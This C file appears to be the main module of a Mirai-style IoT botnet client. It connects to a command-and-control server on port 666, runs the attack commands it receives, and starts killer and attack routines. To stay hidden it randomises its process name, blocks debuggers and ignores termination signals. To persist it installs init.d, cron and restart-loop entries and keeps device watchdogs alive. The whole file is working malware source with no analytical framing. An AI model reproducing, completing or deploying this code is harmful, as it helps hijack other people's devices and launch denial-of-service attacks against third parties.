#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/prctl.h>
#include <sys/select.h>
#include <signal.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <time.h>
#include <errno.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "includes.h"
#include "table.h"
#include "rand.h"
#include "attack.h"
#include "resolv.h"
#include "killer.h"
#include "scanner.h"
#include "util.h"
#include "buff.h"

static void anti_gdb_entry(int);
static void resolve_cnc_addr(void);
static void establish_connection(void);
static void teardown_connection(void);
static void ensure_single_instance(void);
static BOOL unlock_tbl_if_nodebug(char *);
static void setup_verification_listener(void);
static void ioctl_keepalive(void);
static void randomize_process_name(void);
static void setup_auto_restart(void);
static void handle_device_restart(void);
static void connection_keepalive(void);
static void connection_health_check(void);
static int connection_retry_count = 0;
static time_t last_keepalive = 0;
static time_t last_connection_time = 0;

#define SINGLE_INSTANCE_PORT 18904

struct sockaddr_in srv_addr;
int fd_ctrl = -1, fd_serv = -1, watchdog_pid = 0, ioctl_pid = 0;
BOOL pending_connection = FALSE;
void (*resolve_func)(void) = (void (*)(void))util_local_addr;

#ifdef DEBUG
    static void segv_handler(int sig, siginfo_t *si, void *unused)
    {
        printf("got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
        exit(EXIT_FAILURE);
    }
#endif


void watchdog_maintain(void)
{
    // Prevent multiple watchdog processes
    if(watchdog_pid > 0)
        return;
        
    watchdog_pid = fork();
    if(watchdog_pid > 0 || watchdog_pid == -1)
        return;

    int timeout = 1;
    int watchdog_fd = 0;
    int found = FALSE;

    table_unlock_val(TABLE_MISC_WATCHDOG);
    table_unlock_val(TABLE_MISC_WATCHDOG2);

    if((watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG, NULL), 2)) != -1 ||
       (watchdog_fd = open(table_retrieve_val(TABLE_MISC_WATCHDOG2, NULL), 2)) != -1)
    {
        #ifdef DEBUG
            printf("[watchdog] found a valid watchdog driver\n");
        #endif
        found = TRUE;
        ioctl(watchdog_fd, 0x80045704, &timeout);
    }
    
    if(found)
    {
        while(TRUE)
        {
            #ifdef DEBUG
                printf("[watchdog] sending keep-alive ioctl call to the watchdog driver\n");
            #endif
            ioctl(watchdog_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    table_lock_val(TABLE_MISC_WATCHDOG);
    table_lock_val(TABLE_MISC_WATCHDOG2);

    // No watchdog device found in this environment; exit child quietly
    _exit(0);
}

void ioctl_keepalive(void)
{
    // Prevent multiple IOCTL processes
    if(ioctl_pid > 0)
        return;
        
    ioctl_pid = fork();
    if(ioctl_pid > 0 || ioctl_pid == -1)
        return;

    // Daemonize the IOCTL keepalive process
    if (fork() > 0)
        _exit(0);
    
    // Create new session and process group
    setsid();
    
    // Change to root directory
    chdir("/");
    
    // Close file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Redirect to /dev/null
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, STDIN_FILENO);
        dup2(devnull, STDOUT_FILENO);
        dup2(devnull, STDERR_FILENO);
        if (devnull > 2) close(devnull);
    }

    int timeout = 1;
    int ioctl_fd = 0;
    int found = FALSE;
    int retry_count = 0;
    const int max_retries = 5;

    while (retry_count < max_retries) {
        table_unlock_val(TABLE_IOCTL_KEEPALIVE1);
        table_unlock_val(TABLE_IOCTL_KEEPALIVE2);
        table_unlock_val(TABLE_IOCTL_KEEPALIVE3);
        table_unlock_val(TABLE_IOCTL_KEEPALIVE4);	

        if((ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE1, NULL), 2)) != -1 ||
           (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE2, NULL), 2)) != -1 ||
           (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE3, NULL), 2)) != -1 ||
           (ioctl_fd = open(table_retrieve_val(TABLE_IOCTL_KEEPALIVE4, NULL), 2)) != -1)
        {
            #ifdef DEBUG
                printf("[ioctl_call] found a driver on the device\n");
            #endif
            found = TRUE;
            ioctl(ioctl_fd, 0x80045704, &timeout);
            break;
        }
        
        table_lock_val(TABLE_IOCTL_KEEPALIVE1);
        table_lock_val(TABLE_IOCTL_KEEPALIVE2);
        table_lock_val(TABLE_IOCTL_KEEPALIVE3);
        table_lock_val(TABLE_IOCTL_KEEPALIVE4);
        
        retry_count++;
        if (retry_count < max_retries) {
            sleep(5); // Wait before retry
        }
    }
    
    if(found)
    {
        while(TRUE)
        {
            #ifdef DEBUG
                printf("[ioctl_call] sending keep-alive ioctl call to the driver\n");
            #endif
            ioctl(ioctl_fd, 0x80045705, 0);
            sleep(10);
        }
    }
    
    // No IOCTL watchdog present; exit child quietly
    _exit(0);
}

int main(int argc, char **args)
{
    char *tbl_exec_succ, name_buf[32], id_buf[32];
    int name_buf_len = 0, tbl_exec_succ_len = 0, pgid = 0, pings = 0;

    #ifndef DEBUG
        sigset_t sigs;

        sigemptyset(&sigs);
        sigaddset(&sigs, SIGINT);
        sigaddset(&sigs, SIGTERM);
        sigaddset(&sigs, SIGHUP);
        sigprocmask(SIG_BLOCK, &sigs, NULL);
        signal(SIGCHLD, SIG_IGN);
        signal(SIGTRAP, &anti_gdb_entry);
        
        // Enhanced signal handling for persistence
        signal(SIGTERM, SIG_IGN);
        signal(SIGHUP, SIG_IGN);
        signal(SIGQUIT, SIG_IGN);

    #endif

    #ifdef DEBUG
        printf("DEBUG MODE YO\n");

        sleep(1);
    #endif

    LOCAL_ADDR = util_local_addr();

    srv_addr.sin_family = AF_INET;
    srv_addr.sin_addr.s_addr = SERVIP;
    srv_addr.sin_port = htons(666);

    table_init();

    anti_gdb_entry(0);

    // ensure_single_instance();

    setup_auto_restart();

    handle_device_restart();

    rand_init();

    // Process name obfuscation - randomize process name
    int original_len = util_strlen(args[0]);
    name_buf_len = (rand_next() % (20 - original_len)) + original_len;
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    util_strcpy(args[0], name_buf);

    util_zero(name_buf, 32);

    // Set random process name using prctl
    name_buf_len = (rand_next() % (20 - original_len)) + original_len;
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    prctl(PR_SET_NAME, name_buf);

    // Clear process buffer information for stealth
    ClearALLBuffer();

    util_zero(id_buf, 32);
    if(argc == 2 && util_strlen(args[1]) < 32)
    {
        util_strcpy(id_buf, args[1]);
        util_zero(args[1], util_strlen(args[1]));
    }

    table_unlock_val(TABLE_EXEC_SUCCESS);
    tbl_exec_succ = table_retrieve_val(TABLE_EXEC_SUCCESS, &tbl_exec_succ_len);
    write(STDOUT, tbl_exec_succ, tbl_exec_succ_len);
    write(STDOUT, "\n", 1);
    table_lock_val(TABLE_EXEC_SUCCESS);

    // Initialize attack methods (required for CNC commands)
    attack_init();
    killer_init();
    watchdog_maintain();
    // scanner_init(); // disabled per request

#ifndef DEBUG
    // Enhanced daemonization for persistence
    if (fork() > 0)
        return 0;
    
    // Create new session and process group
    pgid = setsid();
    
    // Fork again to ensure we're not a session leader
    if (fork() > 0)
        exit(0);
    
    // Change to root directory to avoid unmounting issues
    chdir("/");
    
    // Close all file descriptors
    close(STDIN);
    close(STDOUT);
    close(STDERR);
    
    // Redirect file descriptors to /dev/null for safety
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, STDIN_FILENO);
        dup2(devnull, STDOUT_FILENO);
        dup2(devnull, STDERR_FILENO);
        if (devnull > 2) close(devnull);
    }
#endif
    
    // Add verification listener on port 15578
    setup_verification_listener();

    #ifdef DEBUG
        printf("DEBUG: Entering main connection loop\n");
        fflush(stdout);
    #endif
    
    while (TRUE)
    {
        // Periodic process name randomization for stealth
        static int name_counter = 0;
        if (++name_counter % 1000 == 0) {
            randomize_process_name();
        }
    
        fd_set fdsetrd, fdsetwr, fdsetex;
        struct timeval timeo;
        int mfd, nfds;

        FD_ZERO(&fdsetrd);
        FD_ZERO(&fdsetwr);

        // Socket for accept()
        if (fd_ctrl != -1)
            FD_SET(fd_ctrl, &fdsetrd);

        // Set up CNC sockets
        if (fd_serv == -1) {
            time_t now = time(NULL);
            char timestamp[64];
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
            
            #ifdef DEBUG
                printf("[%s] [CONN] attempting to establish new connection (fd_serv=%d)\n", timestamp, fd_serv);
                fflush(stdout);
            #endif
            establish_connection();
            #ifdef DEBUG
                printf("[%s] [CONN] establish_connection() returned, fd_serv=%d\n", timestamp, fd_serv);
                fflush(stdout);
            #endif
        }

        if (pending_connection)
            FD_SET(fd_serv, &fdsetwr);
        else
            FD_SET(fd_serv, &fdsetrd);

        // Get maximum FD for select
        if (fd_ctrl > fd_serv)
            mfd = fd_ctrl;
        else
            mfd = fd_serv;

        // Wait 30s in call to select() for connection timeout
        timeo.tv_usec = 0;
        timeo.tv_sec = 30;
        nfds = select(mfd + 1, &fdsetrd, &fdsetwr, NULL, &timeo);
        if (nfds == -1)
        {
            time_t now = time(NULL);
            char timestamp[64];
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
            
            #ifdef DEBUG
                printf("[%s] [CONN] select() errno = %d\n", timestamp, errno);
            #endif
            continue;
        }
        else if (nfds == 0)
        {
            // Timeout occurred - perform connection maintenance
            connection_keepalive();
            connection_health_check();
        }

        if(pending_connection)
        {
            // Log connection timeout check
            time_t now = time(NULL);
            char timestamp[64];
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
            
            if(!FD_ISSET(fd_serv, &fdsetwr))
            {
                #ifdef DEBUG
                    printf("[%s] [CONN] timed out while connecting to CNC\n", timestamp);
                #endif
                teardown_connection();
                pending_connection = FALSE;
            }
            else
            {
                int err = 0;
                socklen_t err_len = sizeof(err);

                getsockopt(fd_serv, SOL_SOCKET, SO_ERROR, &err, &err_len);
                if(err != 0)
                {
                    #ifdef DEBUG
                        printf("[%s] [CONN] error while connecting to CNC code=%d\n", timestamp, err);
                    #endif
                    close(fd_serv);
                    fd_serv = -1;
                    pending_connection = FALSE;
                    sleep((rand_next() % 10) + 1);
                }
                else
                {
                    uint8_t id_len = util_strlen(id_buf);

                    LOCAL_ADDR = util_local_addr();
                    
                    #ifdef DEBUG
                        printf("[%s] [CONN] sending handshake to CNC (id_len=%d)\n", timestamp, id_len);
                    #endif
                    
                    send(fd_serv, "\x00\x00\x00\x01", 4, MSG_NOSIGNAL);
                    send(fd_serv, &id_len, sizeof(id_len), MSG_NOSIGNAL);
                    if(id_len > 0)
                    {
                        send(fd_serv, id_buf, id_len, MSG_NOSIGNAL);
                    }

                    pending_connection = FALSE;
                    connection_retry_count = 0; // Reset retry count on successful connection
                    last_connection_time = time(NULL);
                    last_keepalive = time(NULL);

                    #ifdef DEBUG
                        printf("[%s] [CONN] connected to CNC successfully\n", timestamp);
                    #endif
                }
            }
        }
        else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
        {
            int n = 0;
            uint16_t len = 0;
            char rdbuf[1024];

            errno = 0;
            n = recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                time_t now = time(NULL);
                char timestamp[64];
                strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
                
                #ifdef DEBUG
                    printf("[%s] [CONN] lost connection with CNC (errno = %d) 1\n", timestamp, errno);
                #endif
                teardown_connection();
                continue;
            }

            if(len == 0)
            {
                recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
                continue;
            }
            len = ntohs(len);
            if(len > sizeof(rdbuf))
            {
                close(fd_serv);
                fd_serv = -1;
                continue;
            }

            errno = 0;
            n = recv(fd_serv, rdbuf, len, MSG_NOSIGNAL | MSG_PEEK);
            if(n == -1)
            {
                if(errno == EWOULDBLOCK || errno == EAGAIN || errno == EINTR)
                    continue;
                else
                    n = 0;
            }

            if(n == 0)
            {
                time_t now = time(NULL);
                char timestamp[64];
                strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
                
                #ifdef DEBUG
                    printf("[%s] [CONN] lost connection with CNC (errno = %d) 2\n", timestamp, errno);
                #endif
                teardown_connection();
                continue;
            }

            recv(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
            len = ntohs(len);
            
            // Update connection activity timestamp
            last_connection_time = time(NULL);
            
            time_t now = time(NULL);
            char timestamp[64];
            strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
            
            #ifdef DEBUG
                printf("[%s] [CONN] received length field: %d bytes\n", timestamp, len);
            #endif
            
            if (len <= 0 || len > 4096) {
                #ifdef DEBUG
                    printf("[%s] [CONN] Invalid length: %d, skipping\n", timestamp, len);
                #endif
                continue;
            }
            
            recv(fd_serv, rdbuf, len, MSG_NOSIGNAL);
            
            #ifdef DEBUG
                printf("[%s] [CONN] received %d bytes from CNC\n", timestamp, len);
                printf("[%s] [CONN] Buffer content (first 16 bytes): ", timestamp);
                int i;
                for (i = 0; i < 16 && i < len; i++) {
                    printf("%02x ", (unsigned char)rdbuf[i]);
                }
                printf("\n");
            #endif

            if(len > 0) {
                #ifdef DEBUG
                    printf("[MAIN] Calling attack_parse with %d bytes\n", len);
                    fflush(stdout);
                #endif
                
                #ifdef DEBUG
                // Add a simple test to see if attack_parse is being called
                printf("[MAIN] About to call attack_parse...\n");
                fflush(stdout);
                #endif
                
                attack_parse(rdbuf, len);
                
                #ifdef DEBUG
                    printf("[MAIN] attack_parse returned\n");
                    fflush(stdout);
                #endif
                
#ifdef DEBUG
                printf("[MAIN] attack_parse completed\n");
                fflush(stdout);
#endif
            }
        }
    }

    return 0;
}

static void anti_gdb_entry(int sig)
{
    resolve_func = resolve_cnc_addr;
}

static void resolve_cnc_addr(void)
{
    #ifndef USEDOMAIN
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_addr.s_addr = SERVIP;
    // Force correct network byte order for CNC port (666)
    srv_addr.sin_port = htons(666);
    table_lock_val(TABLE_CNC_PORT);
    #else
    struct resolv_entries *entries;
    entries = resolv_lookup(SERVDOM);
    if (entries == NULL)
    {
        srv_addr.sin_addr.s_addr = SERVIP;
        return;
    } else {
        srv_addr.sin_addr.s_addr = entries->addrs[rand_next() % entries->addrs_len];
    }
    
    resolv_entries_free(entries);
    table_unlock_val(TABLE_CNC_PORT);
    srv_addr.sin_port = *((port_t *)table_retrieve_val(TABLE_CNC_PORT, NULL));
    table_lock_val(TABLE_CNC_PORT);
    #endif
}

static void establish_connection(void)
{
    // Prevent multiple connection attempts
    if(fd_serv != -1)
        return;
        
    // Log connection attempt with timestamp
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    #ifdef DEBUG
        printf("[%s] [CONN] attempting to connect to CNC\n", timestamp);
        fflush(stdout);
    #endif

    if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        #ifdef DEBUG
            printf("[%s] [CONN] failed to call socket(). Errno = %d\n", timestamp, errno);
            fflush(stdout);
        #endif
        return;
    }

    fcntl(fd_serv, F_SETFL, O_NONBLOCK | fcntl(fd_serv, F_GETFL, 0));

    // Enable TCP keepalive
    int keepalive = 1;
    int keepidle = 30;    // Start keepalive after 30 seconds of idle
    int keepintvl = 10;   // Send keepalive every 10 seconds
    int keepcnt = 3;      // Send 3 keepalive probes before giving up
    
    setsockopt(fd_serv, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(keepalive));
    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(keepidle));
    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(keepintvl));
    setsockopt(fd_serv, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(keepcnt));

    if(resolve_func != NULL)
        resolve_func();

    pending_connection = TRUE;
    int result = connect(fd_serv, (struct sockaddr *)&srv_addr, sizeof(struct sockaddr_in));
    
    #ifdef DEBUG
        printf("[%s] [CONN] connect() returned %d, errno=%d, pending_connection=%d\n", timestamp, result, errno, pending_connection);
        fflush(stdout);
    #endif
    
    // Log connection state
    if (result == 0) {
        #ifdef DEBUG
            printf("[%s] [CONN] connected immediately\n", timestamp);
            fflush(stdout);
        #endif
        pending_connection = FALSE;
    } else if (errno == EINPROGRESS) {
        #ifdef DEBUG
            printf("[%s] [CONN] connection in progress (EINPROGRESS)\n", timestamp);
            fflush(stdout);
        #endif
    } else {
        #ifdef DEBUG
            printf("[%s] [CONN] connection failed with errno=%d\n", timestamp, errno);
            fflush(stdout);
        #endif
        close(fd_serv);
        fd_serv = -1;
        pending_connection = FALSE;
    }
}

static void teardown_connection(void)
{
    // Log teardown with timestamp
    time_t now = time(NULL);
    char timestamp[64];
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", localtime(&now));
    
    #ifdef DEBUG
        printf("[%s] [CONN] tearing down connection to CNC!\n", timestamp);
    #endif

    if(fd_serv != -1) {
        #ifdef DEBUG
            printf("[%s] [CONN] closing socket fd=%d\n", timestamp, fd_serv);
        #endif
        close(fd_serv);
    }

    fd_serv = -1;
    pending_connection = FALSE;
    
    // Exponential backoff retry
    int retry_delay = (1 << connection_retry_count);
    if (retry_delay > 60) retry_delay = 60; // Max 60 seconds
    connection_retry_count++;
    
    #ifdef DEBUG
        printf("[%s] [CONN] retry delay: %d seconds (attempt %d)\n", timestamp, retry_delay, connection_retry_count);
    #endif
    
    sleep(retry_delay);
}

static void connection_keepalive(void)
{
    time_t now = time(NULL);
    
    // Send keepalive every 30 seconds instead of 180
    if (fd_serv != -1 && !pending_connection && (now - last_keepalive) >= 30) {
        uint16_t len = 0;
        int result = send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
        
        if (result == -1) {
            #ifdef DEBUG
                printf("[CONN] Keepalive send failed (errno=%d)\n", errno);
            #endif
            teardown_connection();
        } else {
            last_keepalive = now;
            #ifdef DEBUG
                printf("[CONN] Keepalive sent successfully\n");
            #endif
        }
    }
}

static void connection_health_check(void)
{
    time_t now = time(NULL);
    
    // Check if connection has been idle for too long
    if (fd_serv != -1 && !pending_connection && (now - last_connection_time) > 300) {
        #ifdef DEBUG
            printf("[CONN] Connection idle for %ld seconds, checking health\n", now - last_connection_time);
        #endif
        
        // Try to send a keepalive to test connection
        uint16_t len = 0;
        int result = send(fd_serv, &len, sizeof(len), MSG_NOSIGNAL);
        
        if (result == -1) {
            #ifdef DEBUG
                printf("[CONN] Health check failed (errno=%d), reconnecting\n", errno);
            #endif
            teardown_connection();
        } else {
            last_connection_time = now;
        }
    }
}

static void setup_verification_listener(void)
{
    int sockfd;
    struct sockaddr_in addr;
    int opt = 1;
    
    // Create socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        return;
    }
    
    // Set socket options
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    
    // Bind to port 15578
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(15578);
    
    if (bind(sockfd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sockfd);
        return;
    }
    
    // Listen for connections
    if (listen(sockfd, 1) < 0) {
        close(sockfd);
        return;
    }
    
    // Fork to handle connections
    if (fork() == 0) {
        while (1) {
            int client_fd;
            struct sockaddr_in client_addr;
            socklen_t client_len = sizeof(client_addr);
            
            client_fd = accept(sockfd, (struct sockaddr*)&client_addr, &client_len);
            if (client_fd >= 0) {
                // Send verification response
                const char *response = "Bot is running and connected!\n";
                send(client_fd, response, strlen(response), 0);
                close(client_fd);
            }
        }
    }
}

static void ensure_single_instance(void)
{
    static BOOL local_bind = TRUE;
    struct sockaddr_in addr;
    int opt = 1;

    if ((fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        return;
    setsockopt(fd_ctrl, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof (int));
    fcntl(fd_ctrl, F_SETFL, O_NONBLOCK | fcntl(fd_ctrl, F_GETFL, 0));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = local_bind ? (INET_ADDR(127,0,0,1)) : LOCAL_ADDR;
    addr.sin_port = htons(SINGLE_INSTANCE_PORT);

    // Try to bind to the control port
    errno = 0;
    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
    {
        if (errno == EADDRNOTAVAIL && local_bind)
            local_bind = FALSE;
#ifdef DEBUG
        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
#endif

        // Reset addr just in case
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = INADDR_ANY;
        addr.sin_port = htons(SINGLE_INSTANCE_PORT);

        if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to connect to fd_ctrl to request process termination\n");
#endif
        }
        
        sleep(5);
        close(fd_ctrl);
        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
        ensure_single_instance(); // Call again, so that we are now the control
    }
    else
    {
        if (listen(fd_ctrl, 1) == -1)
        {
#ifdef DEBUG
            printf("[main] Failed to call listen() on fd_ctrl\n");
#endif
        }
    }
}

static void randomize_process_name(void)
{
    char name_buf[32];
    int name_buf_len;
    
    // Generate random process name
    name_buf_len = (rand_next() % 15) + 5; // 5-20 characters
    rand_alpha_str(name_buf, name_buf_len);
    name_buf[name_buf_len] = 0;
    
    // Set the new process name
    prctl(PR_SET_NAME, name_buf);
}

static void setup_auto_restart(void)
{
    char script_path[256];
    char binary_path[256];
    char pid_file[256];
    int fd;
    
    // Get current binary path
    if (readlink("/proc/self/exe", binary_path, sizeof(binary_path) - 1) == -1) {
        return; // Can't determine binary path
    }
    binary_path[sizeof(binary_path) - 1] = 0;
    
    // // Create startup script paths
    // strcpy(script_path, "/tmp/.systemd");
    // strcpy(pid_file, "/tmp/.systemd.pid");
    
    // Create startup script
    fd = open(script_path, O_CREAT | O_WRONLY | O_TRUNC, 0755);
    if (fd >= 0) {
        char script_content[1024];
        snprintf(script_content, sizeof(script_content),
            "#!/bin/sh\n"
            "# Auto-restart script for bot\n"
            "while true; do\n"
            "    if [ ! -f %s ] || ! kill -0 $(cat %s) 2>/dev/null; then\n"
            "        %s &\n"
            "        echo $! > %s\n"
            "    fi\n"
            "    sleep 30\n"
            "done &\n",
            pid_file, pid_file, binary_path, pid_file);
        
        write(fd, script_content, strlen(script_content));
        close(fd);
        
        // Execute the startup script
        if (fork() == 0) {
            execl("/bin/sh", "sh", script_path, NULL);
            exit(0);
        }
    }
    
    // Create systemd service (if systemd is available) (disabled completely fucks up the targets cpu lol might fix later)
    // fd = open("/etc/systemd/system/bot.service", O_CREAT | O_WRONLY | O_TRUNC, 0644);
    // if (fd >= 0) {
    //     char service_content[512];
    //     snprintf(service_content, sizeof(service_content),
    //         "[Unit]\n"
    //         "Description=System Bot Service\n"
    //         "After=network.target\n"
    //         "\n"
    //         "[Service]\n"
    //         "Type=simple\n"
    //         "ExecStart=%s\n"
    //         "Restart=always\n"
    //         "RestartSec=10\n"
    //         "User=root\n"
    //         "\n"
    //         "[Install]\n"
    //         "WantedBy=multi-user.target\n",
    //         binary_path);
        
    //     write(fd, service_content, strlen(service_content));
    //     close(fd);
        
    //     // Enable the service
    //     if (fork() == 0) {
    //         execl("/bin/systemctl", "systemctl", "enable", "bot.service", NULL);
    //         exit(0);
    //     }
    // }
    
    // Create init.d script for older systems
    fd = open("/etc/init.d/bot", O_CREAT | O_WRONLY | O_TRUNC, 0755);
    if (fd >= 0) {
        char init_script[1024];
        snprintf(init_script, sizeof(init_script),
            "#!/bin/sh\n"
            "### BEGIN INIT INFO\n"
            "# Provides: bot\n"
            "# Required-Start: $network\n"
            "# Required-Stop:\n"
            "# Default-Start: 2 3 4 5\n"
            "# Default-Stop:\n"
            "# Description: System Bot Service\n"
            "### END INIT INFO\n"
            "\n"
            "case \"$1\" in\n"
            "    start)\n"
            "        %s &\n"
            "        echo $! > /var/run/bot.pid\n"
            "        ;;\n"
            "    stop)\n"
            "        kill $(cat /var/run/bot.pid 2>/dev/null) 2>/dev/null\n"
            "        rm -f /var/run/bot.pid\n"
            "        ;;\n"
            "    restart)\n"
            "        $0 stop\n"
            "        sleep 1\n"
            "        $0 start\n"
            "        ;;\n"
            "    *)\n"
            "        echo \"Usage: $0 {start|stop|restart}\"\n"
            "        exit 1\n"
            "        ;;\n"
            "esac\n",
            binary_path);
        
        write(fd, init_script, strlen(init_script));
        close(fd);
        
        // Make it executable and add to startup
        chmod("/etc/init.d/bot", 0755);
        if (fork() == 0) {
            execl("/bin/sh", "sh", "-c", "update-rc.d bot defaults 2>/dev/null || chkconfig bot on 2>/dev/null || true", NULL);
            exit(0);
        }
    }
    
    // Create cron job for additional persistence
    fd = open("/tmp/crontab_entry", O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        char cron_entry[256];
        snprintf(cron_entry, sizeof(cron_entry),
            "@reboot %s >/dev/null 2>&1 &\n",
            binary_path);
        
        write(fd, cron_entry, strlen(cron_entry));
        close(fd);
        
        // Add to crontab
        if (fork() == 0) {
            execl("/bin/sh", "sh", "-c", "crontab /tmp/crontab_entry 2>/dev/null || true", NULL);
            exit(0);
        }
    }
}

static void handle_device_restart(void)
{
    char restart_flag_path[256];
    char pid_file[256];
    time_t current_time = time(NULL);
    time_t last_restart = 0;
    int fd;
    
    // Create restart detection files
    strcpy(restart_flag_path, "/tmp/.bot_restart");
    strcpy(pid_file, "/tmp/.bot_pid");
    
    // Check if this is a restart scenario
    fd = open(restart_flag_path, O_RDONLY);
    if (fd >= 0) {
        read(fd, &last_restart, sizeof(time_t));
        close(fd);
        
        // If last restart was more than 5 minutes ago, this is likely a device restart
        if (current_time - last_restart > 300) {
            #ifdef DEBUG
                printf("[restart] Device restart detected, reinitializing processes\n");
            #endif
            
            // Reinitialize IOCTL keepalive for device restart
            ioctl_pid = 0; // Reset IOCTL PID to allow restart
            ioctl_keepalive();
            
            // Reinitialize watchdog
            watchdog_pid = 0; // Reset watchdog PID
            watchdog_maintain();
        }
    }
    
    // Update restart flag
    fd = open(restart_flag_path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, &current_time, sizeof(time_t));
        close(fd);
    }
    
    // Update PID file
    fd = open(pid_file, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        pid_t pid = getpid();
        write(fd, &pid, sizeof(pid_t));
        close(fd);
    }
}
